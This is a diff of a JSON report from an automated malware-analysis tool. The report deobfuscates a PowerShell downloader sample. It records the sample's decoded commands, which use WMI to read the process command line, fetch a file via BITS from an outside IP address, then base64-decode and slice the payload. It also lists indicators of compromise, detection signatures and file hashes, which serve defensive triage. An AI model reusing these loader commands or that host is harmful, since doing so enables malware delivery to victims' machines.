@@ -1,461 +1,462 @@
 {
-    "extra": {
-        "drop_file": false,
-        "score": 1081,
-        "sections": [
-            {
-                "auto_collapse": false,
-                "body": "[Invoke-Expression] Execute/Open: $Scratc2=$env:windir\n\n[Invoke-Expression] Execute/Open: $Rekrnk=$Scratc2+$Rekrnk\n\n[Invoke-Expression] Execute/Open: $Fluoridi = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34\n\n[Invoke-Expression] Execute/Open: $Inddataa = $Fluoridi[$Fluoridi.count-2]\n\n[Invoke-Expression] Execute/Open: $Sfinks=(Test-Path $Rekrnk) -And ([IntPtr]::size -eq 8)\n\n[Test-Path] \\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\n\n[Invoke-Expression] Execute/Open: $Scratc2=$env:appdata\n\n[Invoke-Expression] Execute/Open: Import-Module BitsTransfer\n\n[Import-Module] BitsTransfer\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Frdiges = Get-Content $Scratc2\n\n[Get-Content] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: $Skibsfa = [System.Convert]::FromBase64String($Frdiges)\n\n[Invoke-Expression] Execute/Open: $Actino2 = [System.Text.Encoding]::ASCII.GetString($Skibsfa)\n\n[Invoke-Expression] Execute/Open: $Dogger=$Actino2.substring(204100,25397)\n",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 0,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 5,
-                    "score": 500,
-                    "score_map": {},
-                    "signatures": {
-                        "suspicious_behaviour_combo_url": 1
-                    }
-                },
-                "tags": {
-                    "file": {
-                        "path": [
-                            "\\Jagtedesh.Sal"
-                        ]
-                    },
-                    "network": {
-                        "dynamic": {
-                            "ip": [
-                                "103.10.68.110"
-                            ],
-                            "uri": [
-                                "http://103.10.68.110/zimbra/Tekstli.asd"
-                            ]
-                        }
-                    }
-                },
-                "title_text": "Actions detected with PSDecode",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"103.10.68.110\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://103.10.68.110/zimbra/Tekstli.asd\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/zimbra/Tekstli.asd\"}]",
-                "body_config": {
-                    "column_order": [
-                        "ioc_type",
-                        "ioc"
-                    ]
-                },
-                "body_format": "TABLE",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 1,
-                    "score": 1,
-                    "score_map": {},
-                    "signatures": {}
-                },
-                "tags": {
-                    "network": {
-                        "dynamic": {
-                            "ip": [
-                                "103.10.68.110"
-                            ],
-                            "uri": [
-                                "http://103.10.68.110/zimbra/Tekstli.asd"
-                            ],
-                            "uri_path": [
-                                "/zimbra/Tekstli.asd"
-                            ]
-                        }
-                    }
-                },
-                "title_text": "IOCs found in actions",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": null,
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 0,
-                "heuristic": null,
-                "tags": {},
-                "title_text": "Suspicious Content Detected in 6db756ef33294db47957b8351d4419dbff3fa7aa508259f419b669eef017fe09",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": null,
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "One Liner": 10
-                    },
-                    "signatures": {
-                        "One Liner": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: One Liner",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": null,
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 0,
-                "heuristic": null,
-                "tags": {},
-                "title_text": "Suspicious Content Detected in layer_1.ps1",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: Start-BitsTransfer",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Downloader": 10
-                    },
-                    "signatures": {
-                        "Downloader": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Downloader",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: Convert, FromBase64String, Text.Encoding",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Compression": 10
-                    },
-                    "signatures": {
-                        "Compression": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Compression",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: Start-Sleep",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Sleeps": 10
-                    },
-                    "signatures": {
-                        "Sleeps": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Sleeps",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: [System.Convert]::FromBase64String(",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Deobfuscation": 10
-                    },
-                    "signatures": {
-                        "Deobfuscation": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Deobfuscation",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: $env:windir",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Enumeration": 10
-                    },
-                    "signatures": {
-                        "Enumeration": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Enumeration",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: gwmi",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Uses WMI": 10
-                    },
-                    "signatures": {
-                        "Uses WMI": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Uses WMI",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: Import-Module, BitsTransfer",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 10,
-                    "score_map": {
-                        "Imports BitsTransfer": 10
-                    },
-                    "signatures": {
-                        "Imports BitsTransfer": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Imports BitsTransfer",
-                "zeroize_on_tag_safe": false
-            },
-            {
-                "auto_collapse": false,
-                "body": "Marks: Downloader, Imports BitsTransfer, Deobfuscation, Compression, Sleeps",
-                "body_config": {},
-                "body_format": "TEXT",
-                "classification": "TLP:C",
-                "depth": 1,
-                "heuristic": {
-                    "attack_ids": [],
-                    "frequency": 1,
-                    "heur_id": 3,
-                    "score": 500,
-                    "score_map": {
-                        "Suspicious Behaviour Combo": 500
-                    },
-                    "signatures": {
-                        "Suspicious Behaviour Combo": 1
-                    }
-                },
-                "tags": {},
-                "title_text": "Signature: Suspicious Behaviour Combo",
-                "zeroize_on_tag_safe": false
-            }
-        ]
-    },
-    "files": {
-        "extracted": [
-            {
-                "name": "deobfuscated.ps1",
-                "sha256": "d605a2483304f2a324d4d4350c27e3280aac986fe40007e325841ec3abf2f141"
-            }
-        ],
-        "supplementary": [
-            {
-                "name": "layer_1.ps1",
-                "sha256": "03f5c72073d2f0efe9fc48d900631807d94d77302307d0a27fb5b95469af0681"
-            },
-            {
-                "name": "layer_0.ps1",
-                "sha256": "35b84df60a53824137133bfe0c5d763519669a9759b26d201fbdb3b990f221e8"
-            },
-            {
-                "name": "layer_2.ps1",
-                "sha256": "a860f7d90f233fcf0936ef9b7c3ef01d0a1669182a32fcef4ab0ed7df6ba1c32"
-            }
-        ]
-    },
-    "results": {
-        "heuristics": [
-            {
-                "attack_ids": [],
-                "heur_id": 1,
-                "signatures": []
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "One Liner"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Downloader"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Compression"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Sleeps"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Deobfuscation"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Enumeration"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Uses WMI"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Imports BitsTransfer"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 3,
-                "signatures": [
-                    "Suspicious Behaviour Combo"
-                ]
-            },
-            {
-                "attack_ids": [],
-                "heur_id": 5,
-                "signatures": [
-                    "suspicious_behaviour_combo_url"
-                ]
-            }
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 1081,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[Invoke-Expression] Execute/Open: $Scratc2=$env:windir\n\n[Invoke-Expression] Execute/Open: $Rekrnk=$Scratc2+$Rekrnk\n\n[Invoke-Expression] Execute/Open: $Fluoridi = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34\n\n[Invoke-Expression] Execute/Open: $Inddataa = $Fluoridi[$Fluoridi.count-2]\n\n[Invoke-Expression] Execute/Open: $Sfinks=(Test-Path $Rekrnk) -And ([IntPtr]::size -eq 8)\n\n[Test-Path] \\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\n\n[Invoke-Expression] Execute/Open: $Scratc2=$env:appdata\n\n[Invoke-Expression] Execute/Open: Import-Module BitsTransfer\n\n[Import-Module] BitsTransfer\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Frdiges = Get-Content $Scratc2\n\n[Get-Content] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: $Skibsfa = [System.Convert]::FromBase64String($Frdiges)\n\n[Invoke-Expression] Execute/Open: $Actino2 = [System.Text.Encoding]::ASCII.GetString($Skibsfa)\n\n[Invoke-Expression] Execute/Open: $Dogger=$Actino2.substring(204100,25397)\n",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 500,
+          "score_map": {},
+          "signatures": {
+            "suspicious_behaviour_combo_url": 1
+          }
+        },
         "tags": {
-            "file.path": [
-                {
-                    "heur_id": 5,
-                    "signatures": [
-                        "suspicious_behaviour_combo_url"
-                    ],
-                    "value": "\\Jagtedesh.Sal"
-                }
-            ],
-            "network.dynamic.ip": [
-                {
-                    "heur_id": 5,
-                    "signatures": [
-                        "suspicious_behaviour_combo_url"
-                    ],
-                    "value": "103.10.68.110"
-                },
-                {
-                    "heur_id": 1,
-                    "signatures": [],
-                    "value": "103.10.68.110"
-                }
-            ],
-            "network.dynamic.uri": [
-                {
-                    "heur_id": 5,
-                    "signatures": [
-                        "suspicious_behaviour_combo_url"
-                    ],
-                    "value": "http://103.10.68.110/zimbra/Tekstli.asd"
-                },
-                {
-                    "heur_id": 1,
-                    "signatures": [],
-                    "value": "http://103.10.68.110/zimbra/Tekstli.asd"
-                }
-            ],
-            "network.dynamic.uri_path": [
-                {
-                    "heur_id": 1,
-                    "signatures": [],
-                    "value": "/zimbra/Tekstli.asd"
-                }
+          "file": {
+            "path": [
+              "\\Jagtedesh.Sal"
             ]
+          },
+          "network": {
+            "dynamic": {
+              "ip": [
+                "103.10.68.110"
+              ],
+              "uri": [
+                "http://103.10.68.110/zimbra/Tekstli.asd"
+              ]
+            }
+          }
+        },
+        "title_text": "Actions detected with PSDecode",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"103.10.68.110\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://103.10.68.110/zimbra/Tekstli.asd\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/zimbra/Tekstli.asd\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "dynamic": {
+              "ip": [
+                "103.10.68.110"
+              ],
+              "uri": [
+                "http://103.10.68.110/zimbra/Tekstli.asd"
+              ],
+              "uri_path": [
+                "/zimbra/Tekstli.asd"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in actions",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in 6db756ef33294db47957b8351d4419dbff3fa7aa508259f419b669eef017fe09",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "One Liner": 10
+          },
+          "signatures": {
+            "One Liner": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: One Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in layer_1.ps1",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Start-BitsTransfer",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Downloader": 10
+          },
+          "signatures": {
+            "Downloader": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Downloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Convert, FromBase64String, Text.Encoding",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Compression": 10
+          },
+          "signatures": {
+            "Compression": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Compression",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Start-Sleep",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Sleeps": 10
+          },
+          "signatures": {
+            "Sleeps": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Sleeps",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: [System.Convert]::FromBase64String(",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Deobfuscation": 10
+          },
+          "signatures": {
+            "Deobfuscation": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Deobfuscation",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: $env:windir",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Enumeration": 10
+          },
+          "signatures": {
+            "Enumeration": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Enumeration",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: gwmi",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Uses WMI": 10
+          },
+          "signatures": {
+            "Uses WMI": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Uses WMI",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Import-Module, BitsTransfer",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Imports BitsTransfer": 10
+          },
+          "signatures": {
+            "Imports BitsTransfer": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Imports BitsTransfer",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Downloader, Imports BitsTransfer, Deobfuscation, Compression, Sleeps",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "Suspicious Behaviour Combo": 500
+          },
+          "signatures": {
+            "Suspicious Behaviour Combo": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Suspicious Behaviour Combo",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "deobfuscated.ps1",
+        "sha256": "d605a2483304f2a324d4d4350c27e3280aac986fe40007e325841ec3abf2f141"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "layer_1.ps1",
+        "sha256": "03f5c72073d2f0efe9fc48d900631807d94d77302307d0a27fb5b95469af0681"
+      },
+      {
+        "name": "layer_0.ps1",
+        "sha256": "35b84df60a53824137133bfe0c5d763519669a9759b26d201fbdb3b990f221e8"
+      },
+      {
+        "name": "layer_2.ps1",
+        "sha256": "a860f7d90f233fcf0936ef9b7c3ef01d0a1669182a32fcef4ab0ed7df6ba1c32"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "One Liner"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Downloader"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Compression"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Sleeps"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Deobfuscation"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Enumeration"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Uses WMI"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Imports BitsTransfer"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Suspicious Behaviour Combo"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "suspicious_behaviour_combo_url"
+        ]
+      }
+    ],
+    "tags": {
+      "file.path": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "\\Jagtedesh.Sal"
         }
-    }
+      ],
+      "network.dynamic.ip": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "103.10.68.110"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "103.10.68.110"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://103.10.68.110/zimbra/Tekstli.asd"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://103.10.68.110/zimbra/Tekstli.asd"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/zimbra/Tekstli.asd"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
